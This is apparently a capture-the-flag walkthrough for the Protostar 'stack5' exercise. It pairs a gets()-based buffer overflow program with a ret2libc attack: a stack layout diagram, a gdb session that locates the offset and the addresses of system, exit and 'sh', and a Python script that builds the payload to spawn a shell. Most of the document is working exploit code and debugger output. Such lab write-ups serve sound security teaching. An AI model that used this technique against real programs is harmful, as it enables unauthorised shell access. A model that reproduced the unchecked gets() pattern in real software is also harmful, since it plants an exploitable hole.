source code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
perform ret2libc, stack layout before `ret` instruction,

```
[argument     ]
[new ret addr ]
[saved eip    ] <- esp
```

smash the stack,
```
[addr of "sh"]
[&exit(could be other)]
[&system     ] <- esp
```

use `(gdb) find &system, +9999999, "sh"` to find address of string `"sh"`.

Notice: what is strange: gdb string search finds a wrong answer.

```
user@protostar:~$ gdb ./stack5
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /home/user/stack5...done.
(gdb) disas main
Dump of assembler code for function main:
0x080483c4 <main+0>:	push   %ebp
0x080483c5 <main+1>:	mov    %esp,%ebp
0x080483c7 <main+3>:	and    $0xfffffff0,%esp
0x080483ca <main+6>:	sub    $0x50,%esp
0x080483cd <main+9>:	lea    0x10(%esp),%eax
0x080483d1 <main+13>:	mov    %eax,(%esp)
0x080483d4 <main+16>:	call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:	leave  
0x080483da <main+22>:	ret    
End of assembler dump.
(gdb) b *main+22
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) r
Starting program: /home/user/stack5 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x41346349
) at stack5/stack5.c:11
11	stack5/stack5.c: No such file or directory.
	in stack5/stack5.c
(gdb) x $esp
0xbffff6fc:	0x63413563
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
(gdb) find &system, +99999999, "sh"
0xb7fb7a95
0xb7fb821d
(gdb) x/s 0xb7fb821d
0xb7fb821d:	 "sh"
(gdb) x/s 0xb7fb7a95
0xb7fb7a95:	 "getpwuid_r"
```

```python
from __future__ import print_function
from struct import pack

offset = 76
system = 0xb7ecffb0
exit = 0xb7ec60c0
sh = 0xb7fb821d

payload = b'A' * offset
payload += pack('<I', system) # '<I' means little endian, four bytes
payload += pack('<I', exit)
payload += pack('<I', sh)

print(payload, end='')
```